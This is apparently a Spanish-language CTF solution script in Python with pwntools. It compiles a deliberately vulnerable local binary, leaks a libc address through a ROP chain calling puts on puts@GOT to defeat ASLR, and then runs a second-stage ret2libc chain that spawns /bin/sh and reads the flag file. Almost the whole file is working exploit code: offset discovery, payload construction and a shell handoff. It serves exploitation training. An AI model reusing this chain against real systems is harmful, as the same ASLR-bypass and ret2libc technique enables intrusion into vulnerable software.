#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CTF-05 - "Eco desde el abismo": leak de libc en dos etapas, ASLR ON.
Diagnóstico: ASLR activada (sin setarch), No PIE, trampolín embebido
g_pop_rdi + g_ret, PLT/GOT accesibles.
Razonamiento: la base se FILTRA, no se lee. Etapa 1: puts(puts@GOT)
imprime la dirección real de puts y la cadena regresa a victima()
(símbolo fijo del binario). Etapa 2: libc.address = leak - offset_de_puts
y el ret2libc de siempre.
PITFALL CLAVE (medido en la Parte 3): en la 2a visita a victima() la
paridad de $rsp queda INVERTIDA (entró por ret, no por call): el ret de
alineación que funciona en la etapa 1 SOBRA en la etapa 2 y system
muere en movaps. Medir, no memorizar.
USO: python3 sol_ctf05.py"""
from pwn import *
import os
import re
import subprocess
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './ctf05'
FLAG_DEMO = 'FLAG{CTF05_eco_del_abismo}'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'ctf05.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

if not os.path.exists('flag.txt'):
    with open('flag.txt', 'w') as f:
        f.write(FLAG_DEMO + '\n')
    log.info('flag.txt de práctica creado')

elf = ELF(BIN, checksec=False)
g_pop_rdi = elf.symbols['g_pop_rdi']
g_ret = elf.symbols['g_ret']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
victima = elf.symbols['victima']
log.info('g_pop_rdi = %#x | puts@plt = %#x | puts@GOT = %#x',
         g_pop_rdi, puts_plt, puts_got)

# RUTA de libc (solo para el offset de puts dentro de SU libc)
ldd_out = subprocess.run(['ldd', BIN], capture_output=True, text=True).stdout
m = re.search(r'libc\.so\.6 => (\S+) \(0x[0-9a-f]+\)', ldd_out)
if not m:
    log.failure('ldd no mostró la ruta de libc.')
    raise SystemExit(1)
libc = ELF(m.group(1), checksec=False)
log.info('libc local: %s (offset de puts: %#x)', m.group(1),
         libc.symbols['puts'])

# ------------------------------------------------------------------
# FASE 1 - offset dinámico (cyclic + corefile, método A2)
# ------------------------------------------------------------------
io = process(BIN)                      # ASLR ACTIVADA: process normal
io.recvuntil(b'acepta una linea:\n')   # sincroniza CON el salto de línea
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - ETAPA 1 del leak:
#   [g_pop_rdi][puts@GOT][puts@plt][g_ret][victima]
#   puts imprime los 8 bytes crudos de puts@GOT (dirección REAL) y el
#   ret final devuelve el control a victima(): segunda oportunidad.
# ------------------------------------------------------------------
io = None
for intento in range(6):
    io = process(BIN)                  # cada intento: proceso nuevo, base nueva
    io.recvuntil(b'acepta una linea:\n')
    stage1 = (b'A' * offset
              + p64(g_pop_rdi)
              + p64(puts_got)
              + p64(puts_plt)
              + p64(g_ret)             # alineación de la 2a visita
              + p64(victima))
    assert b'\n' not in stage1, 'gets() cortaría el payload en 0x0a'
    io.sendline(stage1)
    leak_line = io.recvline(timeout=5).strip(b'\n')
    leak = u64(leak_line.ljust(8, b'\x00'))
    if leak >= 0x7f0000000000:
        break
    io.close()                         # leak truncado por un 0x0a: reintentar
    log.warn('leak truncado (%#x); reintento %d', leak, intento + 1)
else:
    log.failure('Seis leaks truncados seguidos: mala suerte con ASLR.')
    raise SystemExit(1)
log.success('puts real filtrada: %#x', leak)

# ------------------------------------------------------------------
# FASE 3 - ETAPA 2: base calculada, ret2libc SIN ret extra.
#   La paridad invertida de la 2a visita convierte el g_ret en EXCESO:
#   si lo pones, system desalinea y muere en movaps (do_system).
# ------------------------------------------------------------------
libc.address = leak - libc.symbols['puts']
log.success('Base de libc calculada: %#x', libc.address)
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
log.info('system = %#x | "/bin/sh" = %#x', system, binsh)

io.recvuntil(b'acepta una linea:\n')   # victima() abierta por 2a vez
stage2 = (b'A' * offset
          + p64(g_pop_rdi)
          + p64(binsh)
          + p64(system))               # SIN g_ret: paridad ya invertida
assert b'\n' not in stage2, 'gets() cortaría el payload en 0x0a'
io.sendline(stage2)
time.sleep(0.5)
io.sendline(b'cat flag.txt; echo PWNED_CTF05_$(id -u); id; exit')
salida = io.recvall(timeout=4)
io.close()

if b'PWNED_CTF05' in salida and (FLAG_DEMO.encode() in salida
                                 or b'FLAG{' in salida):
    log.success('CTF-05 SUPERADO: leak + cálculo de base + shell, todo '
                'con ASLR activada.')
else:
    log.failure('CTF-05: sin shell. Repasa: recvuntil exacto, g_ret antes '
                'de victima (etapa 1) y NINGÚN ret antes de system (etapa 2).')
